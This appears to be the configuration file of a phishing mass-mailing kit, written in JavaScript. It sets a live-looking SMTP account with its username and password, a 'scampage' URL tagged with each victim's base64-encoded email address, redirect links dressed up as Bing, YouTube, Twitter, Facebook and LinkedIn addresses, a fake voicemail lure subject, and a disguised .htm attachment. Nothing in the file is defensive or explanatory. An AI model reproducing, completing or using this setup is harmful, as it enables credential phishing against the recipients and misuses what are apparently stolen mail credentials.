var smtpConfig = {
    // SMTP DETAILS HERE
    host: 'mail.intellium.com.tr',
    port: '587',
    secure: false, // if port 587, false. if port 465 = true
    user: 'osman.alcicek',
    pass: 'O1s8m6a7n.*@'
};
/**
 * For randomLinks, Use "SILENTCODERSBASE" for command in your html letter href, you need atleast 2 links url for random.
 * The example like this
 * [
 * 'https://example.com/?e=BASE64EMAIL=EMAIL',
 * 'https://example2.com/?e=BASE64EMAIL=EMAIL',
 * 'https://example3.com/?e=BASE64EMAIL=EMAIL',
 * 'https://example4.com/?e=BASE64EMAIL=EMAIL',
 * ]
* Put after const link = [
* And the ] symbol dont be delete
*/

var links = [
	'http://CHAR4.bing.com./#./?CHAR5/#BASE64EMAIL',
    'http://CHAR4.youtube.com./#./?CHAR5/#BASE64EMAIL',
    'http://CHAR4.twitter.com./#./?CHAR5/#BASE64EMAIL',
    'http://CHAR4.youtube.com./#./?CHAR5/#BASE64EMAIL',
    'http://CHAR4.facebook.com./#./?CHAR5/#BASE64EMAIL',
    'http://CHAR4.linkedin.com./#./?CHAR5/#BASE64EMAIL',
];
// Your Scampage Link
var base_href = 'http://feedlds.com/?e=BASE64EMAIL';

// Valid Letter path
var letter = 'letter.html';

// If blank, it use smtp mail

var from = ''; 

// Subject to sendout
var subject = '☎ Incoming call with +1764532**9* 26 APR 23'; 

// Attachment 
var use_attachment = false; // true or false
var attachment = __dirname+'/vm.html';
var filename = "☎msg-6578.htm.";

// Timezone 
var timezone = "America/Los_Angeles";

// Priority
var priority = 'high'; // low, normal, high

module.exports = {
	smtpConfig,links,base_href,letter,from,subject,use_attachment,attachment,priority,timezone,filename
}